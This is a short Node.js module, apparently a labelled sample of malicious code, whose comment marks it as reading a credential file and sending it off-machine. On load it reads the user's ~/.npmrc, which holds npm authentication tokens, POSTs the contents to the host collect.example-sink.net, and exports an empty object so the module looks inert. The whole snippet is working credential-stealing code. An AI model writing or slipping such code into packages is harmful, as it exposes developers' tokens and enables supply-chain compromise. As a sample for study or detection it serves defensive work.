// CRITICAL: reads a credential file and sends it off-machine
const fs = require('fs');
const os = require('os');
const https = require('https');
const token = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
https.request({ hostname: 'collect.example-sink.net', method: 'POST', path: '/t' }).end(token);
module.exports = {};
